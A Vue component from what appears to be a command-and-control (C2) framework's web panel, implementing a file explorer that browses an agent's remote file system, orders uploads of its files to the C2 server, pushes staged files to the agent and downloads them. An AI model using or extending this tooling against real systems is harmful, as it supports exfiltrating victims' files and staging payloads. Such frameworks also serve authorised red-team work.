<template>
    <v-dialog
        v-model="dialog"
        transition="dialog-bottom-transition"
        :scrim="false"
    >

        <template v-slot:activator="{ props: activatorProps }">
            <v-btn
                variant="plain"
                density="compact"
                v-bind="activatorProps"
                @click.stop="selected"
            >
                <v-icon icon="mdi-folder-arrow-up-down" />

                <v-tooltip activator="parent" location="top" open-delay="600">
                    <div class="tooltip-el">
                        <h4>File Explorer</h4>
                        Browse files of the remote system with an ability to upload and download files.
                    </div>
                </v-tooltip>
            </v-btn>
        </template>

        <v-card variant="outlined" class="liquid-glass" density="compact">
            <v-toolbar density="compact" class="liquid-glass" title="File Explorer">
                <p>{{ API.store.fileRepo.remote.currentDir }}</p>
                
                <v-toolbar-items>
                </v-toolbar-items>

                <v-spacer />

                <v-btn
                    icon="mdi-close"
                    @click="dialog = false"
                ></v-btn>
            </v-toolbar>

            <div class="pl-4 pr-4">
                <v-row style="min-height: 480px; max-height: 480px;">
                    <v-col cols="6">

                        <div class="d-flex">
                            <h4>Server's Download Repository:</h4>
                            <v-spacer />
                            <v-btn
                                class="ml-4"
                                variant="plain"
                                density="compact"
                            >
                                <v-icon size="26" icon="mdi-file-upload" />

                                <v-tooltip activator="parent" location="top" open-delay="600">
                                    <div class="tooltip-el">
                                        <h4>Upload File To Server</h4>
                                        Upload a file to the command and control server. Once a file
                                        is uploaded then you can order an agent to download it.
                                    </div>
                                </v-tooltip>
                            </v-btn>
                        </div>

                        <div style="max-height: 200px; overflow-y: auto;" class="mb-1">
                            <div
                                v-for="(record, recordIndex) in API.store.fileRepo.downloads"
                            >
                                <div class="d-flex">
                                    <v-icon :icon="record.isDir ? 'mdi-folder' : 'mdi-file-outline'" class="mr-2 ml-5"></v-icon>
                                    <span>{{ record.name }}</span>
                                    <v-spacer />
                                    <span class="file-timestamp">{{ formatUnixNanoTime(record.timestamp) }}</span>
                                    <v-btn
                                        @click="issueDownloadOrder(record)"
                                        variant="plain"
                                        density="compact"
                                        style="float: right;"
                                        :disabled="API.store.fileRepo.loadingDownloads || API.store.fileRepo.loadingRemote"
                                    >
                                        <v-icon icon="mdi-arrow-right-bold"></v-icon>

                                        <v-tooltip activator="parent" location="top" open-delay="600">
                                            <div class="tooltip-el">
                                                <h4>Upload File '{{ record.name }}' To Remote System</h4>
                                                Upload a file to the command and control server. Once a file
                                                is uploaded then you can order an agent to download it.
                                            </div>
                                        </v-tooltip>
                                    </v-btn>
                                </div>

                                <v-divider v-if="recordIndex !== API.store.fileRepo.downloads.length-1" />
                            </div>
                        </div>

                        <h4>Files Uploaded By Agent:</h4>
                        <div style="overflow-y: auto; max-height: 200px;">
                            <div
                                v-for="(record, recordIndex) in API.store.fileRepo.uploads"
                            >
                                <div class="d-flex">
                                    <v-icon :icon="record.isDir ? 'mdi-folder' : 'mdi-file-outline'" class="mr-2 ml-5"></v-icon>
                                    <span>{{ record.name }}</span>
                                    <v-spacer />
                                    <span class="file-timestamp">{{ formatUnixNanoTime(record.timestamp) }}</span>
                                    <v-btn
                                        variant="plain"
                                        density="compact"
                                        @click="downloadFile(record)"
                                        style="float: right;"
                                        :disabled="API.store.fileRepo.loadingUploads"
                                    >
                                        <v-icon icon="mdi-download"></v-icon>

                                        <v-tooltip activator="parent" location="top" open-delay="600">
                                            <div class="tooltip-el">
                                                <h4>Download File '{{ record.name }}'</h4>
                                                Download a file from the C2 server to your machine through the browser.
                                                This file was previously uploaded by the agent onto the C2 server.
                                            </div>
                                        </v-tooltip>
                                    </v-btn>
                                </div>
                                <v-divider v-if="recordIndex !== API.store.fileRepo.uploads.length-1" />
                            </div>
                        </div>
                    </v-col>

                    <v-col>
                        <div class="d-flex">
                            <h4>Remote File System:</h4>
                            <v-spacer />
                            <v-btn
                                variant="plain"
                                density="compact"
                                :disabled="API.store.fileRepo.loadingRemote"
                            >
                                <v-icon size="26" icon="mdi-folder-plus" />

                                <v-tooltip activator="parent" location="top" open-delay="600">
                                    <div class="tooltip-el">
                                        <h4>Create Directory</h4>
                                        Create a new directory on remote system.
                                    </div>
                                </v-tooltip>
                            </v-btn>
                        </div>

                        <div style="max-height: 430px; overflow-y: auto;">
                            <div
                                v-for="(record, recordIndex) in API.store.fileRepo.remote.content"
                            >
                                <div class="d-flex">
                                    <v-btn
                                        v-if="record.isDir === false"
                                        variant="plain"
                                        density="compact"
                                        @click="issueUploadOrder(record)"
                                        :disabled="API.store.fileRepo.loadingRemote"
                                    >
                                        <v-icon icon="mdi-arrow-left-bold"></v-icon>

                                        <v-tooltip activator="parent" location="top" open-delay="600">
                                            <div class="tooltip-el">
                                                <h4>Upload File '{{ record.name }}' To Server</h4>
                                                Upload a file from agent's system onto the C2 server.
                                                After it's uploaded to the C2 server, then you can download
                                                it from your browser.
                                            </div>
                                        </v-tooltip>
                                    </v-btn>

                                    <v-btn
                                        v-if="record.isDir === true"
                                        @click="changeDir(record.name)"
                                        class="fs-directory"
                                        :disabled="API.store.fileRepo.loadingRemote"
                                        density="compact"
                                        variant="text"
                                    >
                                        <v-icon :icon="record.isDir ? 'mdi-folder' : 'mdi-file-outline'" class="mr-2"></v-icon>
                                        <span>{{ record.name }}</span>
                                    </v-btn>
                                    <div
                                        v-else
                                    >
                                        <v-icon :icon="record.isDir ? 'mdi-folder' : 'mdi-file-outline'" class="mr-2"></v-icon>
                                        <span>{{ record.name }}</span>
                                    </div>

                                    <v-spacer />
                                    <span class="file-timestamp">{{ formatUnixNanoTime(record.timestamp) }}</span>
                                </div>
                                <v-divider v-if="recordIndex !== API.store.fileRepo.remote.content.length-1" />
                            </div>
                        </div>
                    </v-col>
                </v-row>
            </div>

            <v-card-actions>
                <!-- <v-btn
                    variant="plain"
                    density="compact"
                    @click="apply"
                >
                    <v-icon icon="mdi-content-save-check"></v-icon>
                    Apply

                    <v-tooltip activator="parent" location="top" open-delay="600">
                        <div class="tooltip-el">
                            <h4>Apply Changes</h4>
                           Confirm sending of instructions to agent to download/upload file/s.
                        </div>
                    </v-tooltip>
                </v-btn> -->
            </v-card-actions>

        </v-card>

    </v-dialog>
</template>

<script lang="ts" setup>

const dialog = ref(false)

const props = defineProps<{
    agentId: string
}>()

const selected = async () => {
    API.value.store.fileRepo.loadingRemote = true
    try {
        API.value.store.fileRepo.agentId = props.agentId
        await API.value.sendMessage(props.agentId, `/ls`)
        await API.value.generalUpdate()
    } catch(e) {
        console.error(e)
    } finally {
    }
}

const issueUploadOrder = async (record: FileRecord) => {
    console.log('upload order:', record)
    API.value.store.fileRepo.loadingDownloads = true
    try {
        await API.value.sendMessage(props.agentId, `/upload-file|${API.value.store.fileRepo.remote.currentDir}\\${record.name}`)
    } catch(e) {
        console.error(e)
    } finally {
        API.value.store.fileRepo.loadingDownloads = false
    }
}

const issueDownloadOrder = async (record: FileRecord) => {
    API.value.store.fileRepo.loadingUploads = true
    try {
        await API.value.sendMessage(props.agentId, `/download-file|${record.name}`)
    } catch(e) {
        console.error(e)
    } finally {
        API.value.store.fileRepo.loadingUploads = false
    }
}

const downloadFile = async (record: FileRecord) => {
    API.value.store.fileRepo.loadingDownloads = true
    try {
        await API.value.downloadFileFromUploadsRepo(record.name)
    } catch(e) {
        console.error(e)
    } finally {
        API.value.store.fileRepo.loadingDownloads = false
    }
}

const apply = async () => {

}

const changeDir = async (dirName: string) => {
    API.value.store.fileRepo.loadingRemote = true
    try {
        const cmd = `/ls|${API.value.store.fileRepo.remote.currentDir}\\${dirName}` // TODO: Accommodate linux case maybe?
        await API.value.sendMessage(props.agentId, cmd)
    } catch(e) {
        console.error(e)
    } finally {
    }
}

</script>

<style scoped>

.file-timestamp {
    color: #616161;
}

.fs-directory {
    cursor: pointer;
    margin-left: 51px;
}

</style>